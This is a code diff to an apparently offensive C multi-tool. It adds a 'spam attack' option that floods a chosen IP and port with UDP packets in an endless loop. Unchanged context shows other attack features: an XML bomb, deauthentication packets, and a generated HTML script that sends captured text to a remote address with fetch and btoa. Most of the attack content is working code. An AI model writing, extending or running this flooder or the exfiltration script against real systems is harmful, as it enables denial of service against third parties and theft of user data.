@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <arpa/inet.h>
+#include <unistd.h>
 
 void help()
 {
@@ -46,6 +48,8 @@ void help()
     printf("  -xm create xml bomb size given by you\n");
     //
     printf("  -sd send deaufthentication packets\n");
+    //
+    printf("  -spA spam attack\n");
 }
 
 void check(int system_inf)
@@ -210,6 +214,34 @@ void nmap_(char *ip,char *port,char command[])
     system(full_command);
 }
 
+void send_udp_packet(const char *target_ip, int target_port) {
+    int sock;
+    struct sockaddr_in dest;
+    char message[] = "4baa6b1d158da078f8ca2bfd061fe15f46273587526ec75ba2119918a9ab504e9151650f114a834e1dd2eda3e5924a8813a02f597b7739074645bd9439b10445";
+
+    // Create socket
+    sock = socket(AF_INET, SOCK_DGRAM, 0);
+    if (sock < 0) {
+        perror("Socket creation failed");
+        exit(1);
+    }
+
+    // Fill in the destination address structure
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(target_port);
+    dest.sin_addr.s_addr = inet_addr(target_ip);
+
+    // Send the packet
+    if (sendto(sock, message, strlen(message), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
+        perror("Send failed");
+    } else {
+        printf("UDP packet sent to %s:%d\n", target_ip, target_port);
+    }
+
+    // Close the socket
+    close(sock);
+}
+
 int main(int argc,char* argv[])
 {
     int system_inf=0,n;
@@ -336,8 +368,11 @@ int main(int argc,char* argv[])
             if (system_inf==0)
             {
                 list_wifi_networks();
-
             }
+        }
+        else if(strcmp(argv[1], "-spA") == 0)
+        {
+            printf("You must give an ip address and port number,proccess aborts\n");
         }
     }
     else if (argc == 3)
@@ -463,6 +498,10 @@ int main(int argc,char* argv[])
                 fclose(fptr);
             }
         }
+        else if(strcmp(argv[1], "-spA") == 0)
+        {
+            printf("You must give a port number too,proccess aborts\n");
+        }
     }
     else if (argc==4)
     {
@@ -483,9 +522,17 @@ int main(int argc,char* argv[])
             fprintf(fptr,"' + btoa(text), {mode:'no-cors'}); \n\t});\n</script>");
             fclose(fptr);
         }
-        else
+        else if(strcmp(argv[1], "-spA") == 0)
         {
-            printf("Too many arguments\n");
+            const char *target_ip = argv[2];
+            //converting argv[3] in an integer,argv[3] is the port
+            int target_port = atoi(argv[3]);;
+            printf("In order to stop the spam attack type Ctrl+C\n");
+            printf("%d",target_port);
+            while(1)
+            {
+                send_udp_packet(target_ip, target_port);
+            }
         }
     }
     else
